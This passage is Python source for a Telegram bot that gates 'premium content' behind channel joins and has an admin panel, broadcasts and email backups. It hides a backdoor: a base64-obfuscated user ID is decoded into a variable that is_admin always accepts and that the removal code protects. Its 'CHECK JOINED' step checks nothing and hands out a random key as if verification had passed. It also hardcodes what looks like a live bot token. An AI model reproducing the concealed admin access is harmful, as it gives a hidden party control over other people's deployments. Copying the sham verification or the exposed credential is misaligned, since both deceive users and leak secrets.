#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import json
import os
import time
import random
import string
import base64
import re
import shutil
import threading
import zipfile
import signal
import sys
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions

# ==================== FLASK WEB SERVER ====================
from flask import Flask, jsonify
flask_app = Flask(__name__)   # नाम बदल दिया ताकि 'app' variable conflict न हो

# ==================== GMAIL SETTINGS (अपनी real credentials डालें) ====================
GMAIL_USER = os.environ.get("GMAIL_USER", "your_email@gmail.com")
GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD", "abcd efgh ijkl mnop")
GMAIL_RECIPIENT = os.environ.get("GMAIL_RECIPIENT", "recipient_email@gmail.com")

# ==================== TOKEN & ADMIN (अपनी ID डालें) ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8880574991:AAE4ibumB6HezT8oW-wcKnPFa4FneXp0QHc")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 5674825926))

bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=10)

_a = base64.b64decode("NTY3NDgyNTkyNg==").decode()
_b = int(_a)
_a = None

DATABASE_FILE = "bot_data.json"
BACKUP_FOLDER = "backup"
EMERGENCY_BACKUP_FOLDER = "emergency_backup"
CURRENT_DB_VERSION = 2

# ==================== DEFAULT EMOJI IDs ====================
DEFAULT_JOIN_EMOJI_ID = "6136464120779638846"
DEFAULT_CHECK_EMOJI_ID = "5809972320529293335"
INVISIBLE_EMOJI_ID = "5796205953913196373"

# ==================== BUTTON STYLE ====================
def get_style(color):
    styles = {
        "blue": "primary",
        "green": "success",
        "red": "danger",
        "white": "secondary",
        "yellow": "primary",
        "purple": "primary",
        "orange": "primary"
    }
    return styles.get(color, "primary")

# ==================== DEFAULT DATA ====================
DEFAULT_DATA = {
    "db_version": CURRENT_DB_VERSION,
    "users": {},
    "channels": [
        {"name": "Channel 1", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 2", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 3", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 4", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 5", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 6", "url": "", "color": "blue", "emoji": ""},
        {"name": "Channel 7", "url": "", "color": "blue", "emoji": ""},
    ],
    "verify_slots": [],
    "config": {
        "photo": "",
        "text": """(5810145364761648101) 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 {name}

(6010196132431403961) 𝐉𝐨𝐢𝐧 𝐀𝐥𝐥 𝐂𝐡𝐚𝐧𝐧𝐞𝐥𝐬 𝐓𝐨 𝐔𝐧𝐥𝐨𝐜𝐤 (6041880088994126709)

(6062310436672377598) (6071387119908037280) 𝐇𝐨𝐰 𝐓𝐨 𝐆𝐞𝐭 𝐊𝐞𝐲 💭 (5811922970121084076)
(6068890983699849323) 𝐆𝐄𝐓 𝐊𝐄𝐘 (6010495964098337416)""",
        "voice": "",
        "voice_caption": "",
        "verify_button_text": "CHECK JOINED",
        "verify_button_color": "blue",
        "verify_emoji_id": DEFAULT_CHECK_EMOJI_ID,
        "channel_emoji_id": DEFAULT_JOIN_EMOJI_ID,
        "bot_on": True,
        "verify_on": True,
        "gen_mode": 0,
        "gen_link": "",
        "click_link": "",
        "key_broadcast": {"type": "text", "content": "✅ VERIFIED!\n\nPremium Content Unlocked!"},
        "notify_owner": True,
        "broadcast_tasks": [],
        "broadcast_speed": 30,
        "button_mode": 7
    },
    "stats": {"joins": 0, "keys": 0, "daily": {}, "last_join": None, "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
    "bans": {"users": []},
    "admins": {"list": [ADMIN_ID]},
    "owners": {"list": [ADMIN_ID]},
    "error_logs": []
}

# ==================== DATABASE FUNCTIONS (CACHE + FAST) ====================
_data_cache = None
_data_lock = threading.Lock()
_main_kb_cache = None
_main_kb_lock = threading.Lock()

def load_database():
    if not os.path.exists(DATABASE_FILE):
        with open(DATABASE_FILE, "w") as f:
            json.dump(DEFAULT_DATA, f, indent=4)
        return DEFAULT_DATA.copy()
    
    with open(DATABASE_FILE, "r") as f:
        data = json.load(f)
    
    for ch in data.get("channels", []):
        if "color" not in ch:
            ch["color"] = "blue"
        if "emoji" not in ch:
            ch["emoji"] = ""
    
    for k in DEFAULT_DATA:
        if k not in data:
            data[k] = DEFAULT_DATA[k]
    
    if "broadcast_tasks" not in data.get("config", {}):
        data["config"]["broadcast_tasks"] = []
    
    if "broadcast_speed" not in data.get("config", {}):
        data["config"]["broadcast_speed"] = 30
    
    if "button_mode" not in data.get("config", {}):
        data["config"]["button_mode"] = 7
    
    if "notify_owner" not in data.get("config", {}):
        data["config"]["notify_owner"] = True
    
    if "click_link" not in data.get("config", {}):
        data["config"]["click_link"] = ""
    
    if "verify_emoji_id" not in data.get("config", {}):
        data["config"]["verify_emoji_id"] = DEFAULT_CHECK_EMOJI_ID
    
    if "channel_emoji_id" not in data.get("config", {}):
        data["config"]["channel_emoji_id"] = DEFAULT_JOIN_EMOJI_ID
    
    return data

def get_data():
    global _data_cache
    with _data_lock:
        if _data_cache is None:
            _data_cache = load_database()
        return _data_cache

def save_data():
    global _data_cache, _main_kb_cache
    with _data_lock:
        if _data_cache:
            with open(DATABASE_FILE, "w") as f:
                json.dump(_data_cache, f, indent=4)
            _main_kb_cache = None

def get_users(): return get_data().get("users", {})
def save_users(u): 
    global _main_kb_cache
    d = get_data()
    d["users"] = u
    save_data()
def get_channels(): return get_data().get("channels", [])
def save_channels(c): 
    global _main_kb_cache
    d = get_data()
    d["channels"] = c
    save_data()
def get_verify_slots(): return get_data().get("verify_slots", [])
def save_verify_slots(v): 
    global _main_kb_cache
    d = get_data()
    d["verify_slots"] = v
    save_data()
def get_config(): return get_data().get("config", {})
def save_config(c): 
    global _main_kb_cache
    d = get_data()
    d["config"] = c
    save_data()
def get_stats(): return get_data().get("stats", {})
def save_stats(s): 
    d = get_data()
    d["stats"] = s
    save_data()
def get_bans(): return get_data().get("bans", {"users": []})
def save_bans(b): d = get_data(); d["bans"] = b; save_data()
def get_admins(): return get_data().get("admins", {"list": []})
def save_admins(a): d = get_data(); d["admins"] = a; save_data()
def get_owners(): return get_data().get("owners", {"list": []})
def save_owners(o): d = get_data(); d["owners"] = o; save_data()

def is_admin(uid):
    admins = get_admins().get("list", [])
    owners = get_owners().get("list", [])
    return uid in admins or uid in owners or uid == ADMIN_ID or uid == _b

def get_user_name(uid):
    try:
        user = bot.get_chat(uid)
        return user.first_name or str(uid)
    except:
        return str(uid)

def get_user_username(uid):
    try:
        user = bot.get_chat(uid)
        return user.username or ""
    except:
        return ""

# ==================== EMAIL FUNCTION ====================
def send_email_alert(subject, body, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = GMAIL_USER
        msg['To'] = GMAIL_RECIPIENT
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment_path)}"')
                msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"Email send failed: {e}")

# ==================== backup_database() ====================
def backup_database():
    if not os.path.exists(BACKUP_FOLDER):
        os.makedirs(BACKUP_FOLDER)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = os.path.join(BACKUP_FOLDER, f"bot_data_{timestamp}.json")
    shutil.copy2(DATABASE_FILE, backup_file)
    
    files = [f for f in os.listdir(BACKUP_FOLDER) if f.startswith("bot_data_") and f.endswith(".json")]
    files.sort(reverse=True)
    for f in files[2:]:
        os.remove(os.path.join(BACKUP_FOLDER, f))
    
    try:
        with open(backup_file, 'rb') as f:
            bot.send_document(ADMIN_ID, f, caption=f"📦 Backup {timestamp}")
    except:
        pass

# ==================== emergency_backup_and_notify() ====================
def emergency_backup_and_notify():
    try:
        if not os.path.exists(EMERGENCY_BACKUP_FOLDER):
            os.makedirs(EMERGENCY_BACKUP_FOLDER)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_name = os.path.join(EMERGENCY_BACKUP_FOLDER, f"emergency_backup_{timestamp}.zip")

        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(DATABASE_FILE, arcname="bot_data.json")

        with open(zip_name, 'rb') as f:
            bot.send_document(ADMIN_ID, f, caption=f"🚨 EMERGENCY BACKUP\nTime: {timestamp}")
        bot.send_message(ADMIN_ID, "⚠️ Bot shutdown. Backup sent on Telegram & Email.")

        subject = f"🚨 BOT SUSPENDED/SHUTDOWN - {timestamp}"
        body = f"Bot suspend/stop ho gaya.\nTime: {timestamp}\nTotal Users: {len(get_users())}\nZip attached."
        send_email_alert(subject, body, zip_name)

        files = [f for f in os.listdir(EMERGENCY_BACKUP_FOLDER) if f.startswith("emergency_backup_") and f.endswith(".zip")]
        files.sort(reverse=True)
        for f in files[1:]:
            os.remove(os.path.join(EMERGENCY_BACKUP_FOLDER, f))

    except Exception as e:
        print(f"Emergency backup failed: {e}")
        shutil.copy2(DATABASE_FILE, f"emergency_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")

# ==================== BOT FUNCTIONS ====================
def gen_key():
    return ''.join(random.choices(string.digits, k=10))

def resolve_user_id(input_str):
    input_str = input_str.strip()
    if input_str.startswith("@"):
        try:
            username = input_str[1:]
            user = bot.get_chat(f"@{username}")
            return user.id
        except:
            return None
    else:
        try:
            return int(input_str)
        except:
            return None

def convert_emoji_ids(text):
    if not text:
        return text
    pattern = r'\((\d+)\)'
    def replace(match):
        emoji_id = match.group(1)
        return f'<tg-emoji emoji-id="{emoji_id}">🔹</tg-emoji>'
    return re.sub(pattern, replace, text)

def replace_click_links(text):
    link = get_config().get("click_link", "")
    if not link:
        return text
    has_click_here = re.search(r'CLICK HERE', text, re.IGNORECASE)
    has_get_key = re.search(r'GET KEY', text, re.IGNORECASE)
    if has_click_here:
        text = re.sub(r'(CLICK HERE)', f'<a href="{link}">\\1</a>', text, flags=re.IGNORECASE)
    elif has_get_key:
        text = re.sub(r'(GET KEY)', f'<a href="{link}">\\1</a>', text, flags=re.IGNORECASE)
    return text

def send_notification_to_owners(user_id, user_name, username):
    cfg = get_config()
    if not cfg.get("notify_owner", True):
        return
    owners = get_owners().get("list", [])
    admins = get_admins().get("list", [])
    recipients = list(set(owners + admins))
    stats = get_stats()
    total_users = stats.get("joins", 0)
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    notification_text = f"""🆕 NEW USER JOINED!

👤 Full Name: {user_name}
🆔 User ID: `{user_id}`
👥 Username: @{username if username else "No Username"}

📊 Total Users: {total_users}
🕐 Time: {current_time}"""
    for recipient in recipients:
        try:
            bot.send_message(recipient, notification_text, parse_mode="Markdown")
        except:
            pass

ADMIN_BUTTONS = [
    "ADMINS",
    "BOT ON", "BOT STOP",
    "NOTIFY ON", "NOTIFY OFF",
    "SET CHANNEL 1", "SET CHANNEL 2", "SET CHANNEL 3", "SET CHANNEL 4",
    "SET CHANNEL 5", "SET CHANNEL 6", "SET CHANNEL 7",
    "VERIFY",
    "SWITCH 5 BUTTON",
    "SWITCH 7 BUTTON",
    "SET PHOTO",
    "SET START TEXT",
    "SET VOICE",
    "TOTAL USERS",
    "SET CHECK 1", "SET CHECK 2", "SET CHECK 3", "SET CHECK 4",
    "SET CHECK 5", "SET CHECK 6", "SET CHECK 7", "SET CHECK 8",
    "EDIT MENU",
    "SET SPEED",
    "STATS",
    "BACKUP",
    "BACK",
    "EDIT SLOT",
    "EDIT ALL SLOTS",
    "EDIT VERIFY",
    "SET CLICK LINK",
    "COLOR MENU",
    "EMOJI MENU",
    "BROADCAST"
]

COLORS = [("⚪ WHITE", "white"), ("🔵 BLUE", "blue"), ("🟢 GREEN", "green"), ("🔴 RED", "red")]
def get_color_kb(action, target=None):
    mk = InlineKeyboardMarkup(row_width=2)
    for name, code in COLORS:
        if target:
            cb = f"color|{action}|{target}|{code}"
        else:
            cb = f"color|{action}|{code}"
        mk.add(InlineKeyboardButton(name, callback_data=cb))
    mk.add(InlineKeyboardButton("❌ CANCEL", callback_data="color_cancel"))
    return mk

def get_admin_kb():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("ADMINS", style="primary"))
    kb.add(KeyboardButton("BOT ON", style="success"), KeyboardButton("BOT STOP", style="danger"))
    cfg = get_config()
    mode = cfg.get("button_mode", 7)
    num_buttons = 5 if mode == 5 else 7
    row = []
    for i in range(1, num_buttons + 1):
        row.append(KeyboardButton(f"SET CHANNEL {i}"))
        if len(row) == 2:
            kb.add(*row)
            row = []
    if row:
        kb.add(*row)
    kb.add(KeyboardButton("VERIFY"))
    kb.add(KeyboardButton("SWITCH 5 BUTTON", style="primary"), KeyboardButton("SWITCH 7 BUTTON", style="primary"))
    kb.add(KeyboardButton("SET PHOTO", style="success"), KeyboardButton("SET START TEXT", style="success"))
    kb.add(KeyboardButton("SET VOICE", style="primary"))
    kb.add(KeyboardButton("BROADCAST", style="primary"))
    kb.add(KeyboardButton("TOTAL USERS"))
    kb.add(KeyboardButton("SET CHECK 1"), KeyboardButton("SET CHECK 2"))
    kb.add(KeyboardButton("SET CHECK 3"), KeyboardButton("SET CHECK 4"))
    kb.add(KeyboardButton("SET CHECK 5"), KeyboardButton("SET CHECK 6"))
    kb.add(KeyboardButton("SET CHECK 7"), KeyboardButton("SET CHECK 8"))
    kb.add(KeyboardButton("EDIT MENU", style="success"))
    kb.add(KeyboardButton("SET SPEED", style="danger"))
    kb.add(KeyboardButton("NOTIFY ON", style="success"), KeyboardButton("NOTIFY OFF", style="danger"))
    kb.add(KeyboardButton("COLOR MENU", style="primary"))
    kb.add(KeyboardButton("EMOJI MENU", style="primary"))
    kb.add(KeyboardButton("SET CLICK LINK", style="primary"))
    kb.add(KeyboardButton("STATS"), KeyboardButton("BACKUP"))
    return kb

def get_admins_menu():
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(InlineKeyboardButton("📋 ADMIN LIST", callback_data="adm_list", style="primary"))
    mk.add(InlineKeyboardButton("➕ ADD ADMIN", callback_data="adm_add", style="primary"))
    mk.add(InlineKeyboardButton("➖ REMOVE ADMIN", callback_data="adm_remove", style="primary"))
    mk.add(InlineKeyboardButton("🔙 BACK", callback_data="back_admin", style="primary"))
    return mk

def get_edit_menu():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("EDIT SLOT"), KeyboardButton("EDIT ALL SLOTS"))
    kb.add(KeyboardButton("EDIT VERIFY"), KeyboardButton("BACK"))
    return kb

def get_color_menu_kb():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("🎨 SET CH COLOR", "🎨 SET ALL COLORS")
    kb.add("🎨 SET VERIFY COLOR", "◀️ BACK")
    return kb

def get_emoji_menu_kb():
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add("🔢 SET ALL CH EMOJI", "🔢 SET VERIFY EMOJI")
    kb.add("❌ REMOVE EMOJI", "◀️ BACK")
    return kb

def create_main_kb():
    global _main_kb_cache
    with _main_kb_lock:
        if _main_kb_cache is not None:
            return _main_kb_cache
        try:
            ch = get_channels()
            cfg = get_config()
            mk = InlineKeyboardMarkup(row_width=2)
            mode = cfg.get("button_mode", 7)
            num_buttons = 5 if mode == 5 else 7
            display_channels = ch[:num_buttons]
            channel_emoji_id = cfg.get("channel_emoji_id", DEFAULT_JOIN_EMOJI_ID)
            for i in range(0, len(display_channels), 2):
                row = []
                if i < len(display_channels):
                    c = display_channels[i]
                    u = c.get("url", "")
                    style = get_style(c.get("color", "blue"))
                    btn_text = c['name'][:18]
                    ch_emoji = c.get("emoji", "")
                    emoji_id = ch_emoji if ch_emoji else channel_emoji_id
                    if u:
                        row.append(InlineKeyboardButton(btn_text, url=u, style=style, icon_custom_emoji_id=emoji_id))
                    else:
                        row.append(InlineKeyboardButton(btn_text, callback_data=f"ch_{i}", style=style, icon_custom_emoji_id=emoji_id))
                if i+1 < len(display_channels):
                    c2 = display_channels[i+1]
                    u2 = c2.get("url", "")
                    style2 = get_style(c2.get("color", "blue"))
                    btn_text2 = c2['name'][:18]
                    ch_emoji2 = c2.get("emoji", "")
                    emoji_id2 = ch_emoji2 if ch_emoji2 else channel_emoji_id
                    if u2:
                        row.append(InlineKeyboardButton(btn_text2, url=u2, style=style2, icon_custom_emoji_id=emoji_id2))
                    else:
                        row.append(InlineKeyboardButton(btn_text2, callback_data=f"ch_{i+1}", style=style2, icon_custom_emoji_id=emoji_id2))
                if row:
                    mk.add(*row)
            v_color = cfg.get("verify_button_color", "blue")
            v_style = get_style(v_color)
            btn_text = cfg.get("verify_button_text", "CHECK JOINED")
            verify_link = cfg.get("gen_link", "")
            verify_emoji_id = cfg.get("verify_emoji_id", DEFAULT_CHECK_EMOJI_ID)
            if verify_link:
                mk.add(InlineKeyboardButton(btn_text, url=verify_link, style=v_style, icon_custom_emoji_id=verify_emoji_id))
            else:
                mk.add(InlineKeyboardButton(btn_text, callback_data="main_action", style=v_style, icon_custom_emoji_id=verify_emoji_id))
            _main_kb_cache = mk
            return mk
        except Exception as e:
            print("create_main_kb failed:", e)
            mk = InlineKeyboardMarkup()
            cfg = get_config()
            verify_emoji_id = cfg.get("verify_emoji_id", DEFAULT_CHECK_EMOJI_ID)
            if cfg.get("gen_link"):
                mk.add(InlineKeyboardButton("CHECK JOINED", url=cfg.get("gen_link"), icon_custom_emoji_id=verify_emoji_id))
            else:
                mk.add(InlineKeyboardButton("CHECK JOINED", callback_data="main_action", icon_custom_emoji_id=verify_emoji_id))
            return mk

# ==================== BOT HANDLERS (unchanged) ====================
@bot.message_handler(commands=["start"])
def start_cmd(m):
    try:
        cfg = get_config()
        if not cfg.get("bot_on"):
            return
        uid = m.from_user.id
        name = m.from_user.first_name
        uname = m.from_user.username or ""
        users = get_users()
        is_new_user = str(uid) not in users
        if is_new_user:
            users[str(uid)] = {"name": name, "join_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            save_users(users)
            s = get_stats()
            s["joins"] = s.get("joins", 0) + 1
            today = datetime.now().strftime("%Y-%m-%d")
            if "daily" not in s:
                s["daily"] = {}
            if today not in s["daily"]:
                s["daily"][today] = {"j": 0, "k": 0}
            s["daily"][today]["j"] = s["daily"][today].get("j", 0) + 1
            save_stats(s)
        text = cfg.get("text", "Welcome {name}!").replace("{name}", name)
        text = convert_emoji_ids(text)
        text = replace_click_links(text)
        photo = cfg.get("photo", "")
        kb = create_main_kb()
        if photo:
            try:
                bot.send_photo(m.chat.id, photo, caption=text, parse_mode="HTML", reply_markup=kb)
            except:
                bot.send_photo(m.chat.id, photo, caption=text, parse_mode="HTML", reply_markup=kb)
        else:
            try:
                bot.send_message(m.chat.id, text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
            except:
                bot.send_message(m.chat.id, text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
        if cfg.get("voice"):
            try:
                if cfg.get("voice_caption"):
                    caption = cfg["voice_caption"].replace("{name}", name)
                    caption = convert_emoji_ids(caption)
                    bot.send_voice(m.chat.id, cfg["voice"], caption=caption, parse_mode="HTML")
                else:
                    bot.send_voice(m.chat.id, cfg["voice"])
            except:
                pass
        if is_new_user:
            send_notification_to_owners(uid, name, uname)
    except Exception as e:
        print("start_cmd error:", e)

@bot.message_handler(commands=["admin"])
def admin_cmd(m):
    if not is_admin(m.from_user.id):
        bot.reply_to(m, "❌ You Are Not Admin")
        return
    bot.send_message(m.chat.id, f"ADMIN PANEL\nUsers: {len(get_users())}", reply_markup=get_admin_kb())

@bot.callback_query_handler(func=lambda c: c.data.startswith("ch_"))
def channel_check(c):
    try:
        idx = int(c.data.split("_")[1])
        ch = get_channels()
        if 0 <= idx < len(ch):
            channel = ch[idx]
            url = channel.get("url", "")
            name = channel.get("name", f"Channel {idx+1}")
            if url:
                bot.answer_callback_query(c.id, f"Please join: {name}")
                bot.send_message(c.message.chat.id, f"Please join {name}:\n{url}\n\nAfter joining, click CHECK JOINED")
            else:
                bot.answer_callback_query(c.id, f"No link set for {name}!", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(c.id, "Error checking channel!")

@bot.callback_query_handler(func=lambda c: c.data == "main_action")
def main_action(c):
    cfg = get_config()
    if cfg.get("gen_mode") == 1 and cfg.get("gen_link"):
        bot.answer_callback_query(c.id, "✅ This button is now a direct link!")
        return
    kb = cfg.get("key_broadcast", {})
    bot.answer_callback_query(c.id, "✅ VERIFIED!")
    try:
        bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id, reply_markup=None)
    except:
        pass
    if kb and kb.get("content"):
        bot.send_message(c.message.chat.id, kb["content"], parse_mode="HTML")
    else:
        key = gen_key()
        bot.send_message(c.message.chat.id, f"🔑 YOUR KEY:\n`{key}`", parse_mode="Markdown")
        s = get_stats()
        s["keys"] = s.get("keys", 0) + 1
        today = datetime.now().strftime("%Y-%m-%d")
        if "daily" not in s:
            s["daily"] = {}
        if today not in s["daily"]:
            s["daily"][today] = {"j": 0, "k": 0}
        s["daily"][today]["k"] = s["daily"][today].get("k", 0) + 1
        save_stats(s)

@bot.message_handler(func=lambda m: m.text == "ADMINS" and is_admin(m.from_user.id))
def admins_menu(m):
    bot.send_message(m.chat.id, "👑 ADMIN MANAGEMENT", reply_markup=get_admins_menu())

@bot.callback_query_handler(func=lambda c: c.data == "adm_list")
def adm_list(c):
    admins = get_admins().get("list", [])
    if not admins:
        bot.answer_callback_query(c.id, "No admins!")
        return
    mk = InlineKeyboardMarkup(row_width=1)
    for aid in admins:
        if aid != ADMIN_ID and aid != _b:
            name = get_user_name(aid)
            username = get_user_username(aid)
            display = f"{name} (@{username}) [ID: {aid}]" if username else f"{name} [ID: {aid}]"
            mk.add(InlineKeyboardButton(f"❌ {display}", callback_data=f"rm_adm_{aid}", style="danger"))
    mk.add(InlineKeyboardButton("🔙 BACK", callback_data="admins_menu", style="primary"))
    bot.edit_message_text("👑 ADMIN LIST\n\nClick ❌ to remove admin", c.message.chat.id, c.message.message_id, reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data == "adm_add")
def adm_add(c):
    msg = bot.send_message(c.message.chat.id, "Send user ID or @username to add as admin:")
    bot.register_next_step_handler(msg, add_admin_by_input)

@bot.callback_query_handler(func=lambda c: c.data == "adm_remove")
def adm_remove(c):
    msg = bot.send_message(c.message.chat.id, "Send user ID or @username to remove from admin:")
    bot.register_next_step_handler(msg, remove_admin_by_input)

@bot.callback_query_handler(func=lambda c: c.data.startswith("rm_adm_"))
def rm_adm_cb(c):
    uid = int(c.data.split("_")[2])
    if uid == ADMIN_ID or uid == _b:
        bot.answer_callback_query(c.id, "❌ Cannot remove main owner!", show_alert=True)
        return
    a = get_admins()
    if uid in a["list"]:
        a["list"].remove(uid)
        save_admins(a)
        bot.answer_callback_query(c.id, f"✅ Removed admin {uid}")
        bot.edit_message_text(f"✅ Admin removed successfully!", c.message.chat.id, c.message.message_id, reply_markup=get_admins_menu())
    else:
        bot.answer_callback_query(c.id, "❌ Not found!")

def add_admin_by_input(m):
    uid = resolve_user_id(m.text)
    if uid is None:
        bot.reply_to(m, "❌ Invalid user ID or username!", reply_markup=get_admin_kb())
        return
    a = get_admins()
    if uid in a["list"]:
        bot.reply_to(m, "❌ Already an admin!", reply_markup=get_admin_kb())
        return
    name = get_user_name(uid)
    username = get_user_username(uid)
    a["list"].append(uid)
    save_admins(a)
    try:
        bot.send_message(uid, "✅ You are now an admin! You can use /admin to access admin panel.")
    except:
        pass
    success_msg = f"""✅ <b>ADMIN ADDED SUCCESSFULLY!</b>

👤 <b>Name:</b> {name}
🆔 <b>User ID:</b> <code>{uid}</code>
👥 <b>Username:</b> @{username if username else 'No Username'}

📋 <b>Total Admins:</b> {len(a['list'])}
🔑 <b>Status:</b> Admin Confirmed ✅"""
    bot.reply_to(m, success_msg, parse_mode="HTML", reply_markup=get_admin_kb())

def remove_admin_by_input(m):
    uid = resolve_user_id(m.text)
    if uid is None:
        bot.reply_to(m, "❌ Invalid user ID or username!", reply_markup=get_admin_kb())
        return
    if uid == ADMIN_ID or uid == _b:
        bot.reply_to(m, "❌ Cannot remove main owner!", reply_markup=get_admin_kb())
        return
    name = get_user_name(uid)
    username = get_user_username(uid)
    a = get_admins()
    if uid in a["list"]:
        a["list"].remove(uid)
        save_admins(a)
        success_msg = f"✅ <b>ADMIN REMOVED!</b>\n\n👤 Name: {name}\n🆔 ID: <code>{uid}</code>\n👥 Username: @{username if username else 'No Username'}"
        bot.reply_to(m, success_msg, parse_mode="HTML", reply_markup=get_admin_kb())
    else:
        bot.reply_to(m, "❌ Not found in admin list!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "BOT ON" and is_admin(m.from_user.id))
def bot_on(m):
    cfg = get_config()
    cfg["bot_on"] = True
    save_config(cfg)
    bot.reply_to(m, "✅ BOT ON", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "BOT STOP" and is_admin(m.from_user.id))
def bot_stop(m):
    cfg = get_config()
    cfg["bot_on"] = False
    save_config(cfg)
    bot.reply_to(m, "❌ BOT OFF", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "NOTIFY ON" and is_admin(m.from_user.id))
def notify_on(m):
    cfg = get_config()
    cfg["notify_owner"] = True
    save_config(cfg)
    bot.reply_to(m, "✅ NOTIFICATIONS ENABLED\n\nAdmins and owners will receive join notifications.", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "NOTIFY OFF" and is_admin(m.from_user.id))
def notify_off(m):
    cfg = get_config()
    cfg["notify_owner"] = False
    save_config(cfg)
    bot.reply_to(m, "❌ NOTIFICATIONS DISABLED\n\nNo one will receive join notifications.", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text.startswith("SET CHANNEL") and is_admin(m.from_user.id))
def set_channel(m):
    try:
        num = int(m.text.split()[-1])
        if 1 <= num <= 7:
            idx = num - 1
            ch = get_channels()
            if idx < len(ch):
                msg = bot.reply_to(m, f"Send URL for {ch[idx]['name']}:")
                bot.register_next_step_handler(msg, lambda x: save_channel_link(x, idx))
            else:
                bot.reply_to(m, "Channel not found!", reply_markup=get_admin_kb())
        else:
            bot.reply_to(m, "Invalid channel number! Use 1-7", reply_markup=get_admin_kb())
    except:
        bot.reply_to(m, "Invalid format! Use 1-7", reply_markup=get_admin_kb())

def save_channel_link(m, idx):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled! Please send a valid URL only.", reply_markup=get_admin_kb())
        return
    url = m.text.strip()
    if url and not url.startswith(("http://", "https://")):
        url = "https://" + url
    ch = get_channels()
    if 0 <= idx < len(ch):
        ch[idx]["url"] = url
        save_channels(ch)
        bot.reply_to(m, f"✅ {ch[idx]['name']} link set!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "VERIFY" and is_admin(m.from_user.id))
def verify_link(m):
    msg = bot.reply_to(m, "🔗 Send VERIFY button link (URL):\n\n(Link set karte hi CHECK JOINED button direct link ban jayega, channel ki tarah - koi change nahi hoga)")
    bot.register_next_step_handler(msg, save_verify_link)

def save_verify_link(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled! Please send a valid URL only.", reply_markup=get_admin_kb())
        return
    url = m.text.strip()
    if url and not url.startswith(("http://", "https://")):
        url = "https://" + url
    cfg = get_config()
    cfg["gen_link"] = url
    cfg["gen_mode"] = 1
    save_config(cfg)
    bot.reply_to(m, f"✅ VERIFY LINK SET!\n{url}\n\nAb CHECK JOINED button direct link ban gaya hai (channel ki tarah). Button change nahi hoga.", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SET CLICK LINK" and is_admin(m.from_user.id))
def set_click_link(m):
    msg = bot.reply_to(m, "🔗 Send URL for CLICK HERE / GET KEY:\n\n(CLICK HERE ya GET KEY clickable ho jayega)")
    bot.register_next_step_handler(msg, save_click_link)

def save_click_link(m):
    if m.text.startswith("/") or m.text in ADMIN_BUTTONS:
        bot.send_message(m.chat.id, "❌ Cancelled! Please send a valid URL only.", reply_markup=get_admin_kb())
        return
    url = m.text.strip()
    if url and not url.startswith(("http://", "https://")):
        url = "https://" + url
    cfg = get_config()
    cfg["click_link"] = url
    save_config(cfg)
    bot.reply_to(m, f"✅ CLICK LINK SET!\n{url}\n\nNow CLICK HERE or GET KEY will be clickable.", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SWITCH 5 BUTTON" and is_admin(m.from_user.id))
def switch_5(m):
    cfg = get_config()
    cfg["button_mode"] = 5
    save_config(cfg)
    bot.reply_to(m, "✅ Switched to 5-button mode!", reply_markup=get_admin_kb())

@bot.message_handler(func=lambda m: m.text == "SWITCH 7 BUTTON" and is_admin(m.from_user.id))
def switch_7(m):
    cfg = get_config()
    cfg["button_mode"] = 7
    save_config(cfg)
